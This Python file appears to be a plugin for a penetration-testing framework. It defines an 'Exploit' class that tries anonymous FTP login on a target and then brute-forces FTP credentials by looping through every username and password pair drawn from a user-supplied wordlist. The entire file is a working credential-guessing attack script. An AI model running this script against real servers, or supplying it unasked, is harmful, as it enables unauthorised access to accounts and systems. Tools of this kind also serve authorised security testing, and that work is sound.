#!/usr/bin/env python
# encoding: utf-8
from core.Option import *
from protocol.ftp.FTPClient import FTPClient
import ftplib
import os


class Exploit(FTPClient):
    __info__ = {
        "name": "python_ftp",
        "description": "python_ftp",
        "authors": (
            "只因不值得",
        ),
        "references": (
            "www.sariel.top"
        ),
    }
    target = IPOption("", "目标地址")
    port = PortOption("", "FTP端口")
    if port == "":
        port = PortOption(21, "FTP端口")

    def anonymous_login(self):
        """ Trying anonymous login """
        try:
            ftp = ftplib.FTP(self.target)
            x = ftp.connect(self.target, self.port, 1)
            print(x)
            ftp.login('anonymous', 'anonymous')
            print('[+] ' + str(self.target) + ' Login Succeeded.')
            return True
        except Exception:
            print('[-] ' + str(self.target) + ' Login Failed.')
            return False

    def run(self):
        if self.target == "":
            print('[-] Not target set')
        anon = self.anonymous_login()
        if anon:
            return 0
        filename = input('filename_pwd > ')
        file = os.path.exists(filename)
        if not file:
            print('[-] File does not exist')
            return 0
        username = open(filename, 'r')
        user = [i.rstrip('\n') for i in username if i != '\n']
        for i in user:
            for j in user:
                print('[+] Trying：' + i + ':' + j)
                try:
                    ftp = ftplib.FTP(self.target)
                    ftp.connect(self.target,self.port,1)
                    ftp.login(i, j)
                    print('\n[*] ' + str(self.target))
                    print('FTP Login Succeeded：' + i + ':' + j)
                    ftp.quit()
                    return (i, j)
                except Exception:
                    pass
        print('\n[-] Could bot brute force FTP credentials.')
        print('Ps：You may be able to try changing ports')
